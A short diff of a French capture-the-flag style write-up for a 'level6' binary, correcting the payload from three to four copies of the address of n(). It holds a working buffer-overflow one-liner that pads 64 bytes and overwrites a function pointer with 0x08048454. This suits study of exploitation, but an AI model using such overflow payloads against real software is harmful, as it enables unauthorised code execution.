@@ -20,7 +20,7 @@ On localise donc l'adresse de n(): `0x08048454`.
 Sachant que l'espace mémoire est continue, il nous suffit donc de remplir les
 premier 64 bytes puis de remplir le tableau de pointeur de fonction par l'adresse de n().
 
-`$ ./level6 "[64 bytes de remplissage] + [Trois fois l'adresse de n()]"`
+`$ ./level6 "[64 bytes de remplissage] + [Quatre fois l'adresse de n()]"`
 
 `$ ./level6 $(python -c 'print "B" *64 + "\x54\x84\x04\x08"*4')`
 
